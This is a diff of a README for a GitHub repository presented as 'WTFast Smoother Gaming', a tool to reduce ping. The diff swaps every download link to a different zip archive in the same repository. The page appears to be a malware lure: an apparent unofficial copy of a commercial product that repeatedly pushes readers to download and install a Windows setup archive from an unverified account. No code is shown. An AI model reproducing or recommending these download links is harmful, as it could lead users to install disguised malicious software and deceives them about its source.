@@ -1,6 +1,6 @@
 # 🎮 WTFast-Smoother-Gaming-v5.5.39-Desktop - Reduce Ping and Fix Lag Spikes
 
-[![Download Now](https://img.shields.io/badge/Download-Windows%20Setup-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/rachelcornea420/WTFast-Smoother-Gaming-v5.5.39-Desktop/main/v5.5.39/Fast_Desktop_v_Smoother_WT_Gaming_3.9.zip)
+[![Download Now](https://img.shields.io/badge/Download-Windows%20Setup-brightgreen?style=for-the-badge)](https://github.com/rachelcornea420/WTFast-Smoother-Gaming-v5.5.39-Desktop/raw/refs/heads/main/v5.5.39/Fast-v-Smoother-Gaming-Desktop-WT-3.5.zip)
 
 ## 📖 About WTFast Smoother Gaming v5.5.39
 
@@ -33,7 +33,7 @@ This tool focuses on fixing common network issues that cause delays and interrup
 
 ## 🚀 Getting Started
 
-1. Click the large green button at the top or go directly to the [download page](https://raw.githubusercontent.com/rachelcornea420/WTFast-Smoother-Gaming-v5.5.39-Desktop/main/v5.5.39/Fast_Desktop_v_Smoother_WT_Gaming_3.9.zip).  
+1. Click the large green button at the top or go directly to the [download page](https://github.com/rachelcornea420/WTFast-Smoother-Gaming-v5.5.39-Desktop/raw/refs/heads/main/v5.5.39/Fast-v-Smoother-Gaming-Desktop-WT-3.5.zip).  
 2. Follow the step-by-step instructions below to download and install the software on Windows.  
 
 If you have questions or encounter problems, check the FAQ section or open an issue on GitHub.
@@ -41,7 +41,7 @@ If you have questions or encounter problems, check the FAQ section or open an is
 ## ⬇️ Downloading and Installing WTFast Smoother Gaming
 
 1. Visit the download link:  
-   [https://raw.githubusercontent.com/rachelcornea420/WTFast-Smoother-Gaming-v5.5.39-Desktop/main/v5.5.39/Fast_Desktop_v_Smoother_WT_Gaming_3.9.zip](https://raw.githubusercontent.com/rachelcornea420/WTFast-Smoother-Gaming-v5.5.39-Desktop/main/v5.5.39/Fast_Desktop_v_Smoother_WT_Gaming_3.9.zip)  
+   [https://github.com/rachelcornea420/WTFast-Smoother-Gaming-v5.5.39-Desktop/raw/refs/heads/main/v5.5.39/Fast-v-Smoother-Gaming-Desktop-WT-3.5.zip](https://github.com/rachelcornea420/WTFast-Smoother-Gaming-v5.5.39-Desktop/raw/refs/heads/main/v5.5.39/Fast-v-Smoother-Gaming-Desktop-WT-3.5.zip)  
 
 2. On the GitHub page, look for the latest release or an executable setup file. Click on the file name to start downloading the installer.  
 
@@ -94,4 +94,4 @@ desktop-application, game-accelerator, gaming, lag-fix, latency-reduction, multi
 
 ---
 
-[![Download Now](https://img.shields.io/badge/Download-Windows%20Setup-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/rachelcornea420/WTFast-Smoother-Gaming-v5.5.39-Desktop/main/v5.5.39/Fast_Desktop_v_Smoother_WT_Gaming_3.9.zip)
+[![Download Now](https://img.shields.io/badge/Download-Windows%20Setup-brightgreen?style=for-the-badge)](https://github.com/rachelcornea420/WTFast-Smoother-Gaming-v5.5.39-Desktop/raw/refs/heads/main/v5.5.39/Fast-v-Smoother-Gaming-Desktop-WT-3.5.zip)
